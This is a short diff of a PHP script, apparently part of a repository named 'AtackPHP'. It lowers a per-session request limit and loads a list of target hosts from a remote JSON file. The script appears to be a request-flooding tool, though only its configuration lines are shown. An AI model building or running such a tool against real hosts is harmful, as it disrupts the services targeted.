@@ -3,7 +3,7 @@
     $total = 0;
     $count = 0;
 
-    $sessionMaxRequests = 5000;
+    $sessionMaxRequests = 10;//5000;
 
     //$hosts = json_decode(file_get_contents('http://rockstarbloggers.ru/hosts.json'), true);
     $hosts = json_decode(file_get_contents('https://raw.githubusercontent.com/DanylovkyiAM/AtackPHP/main/hosts.json'), true);
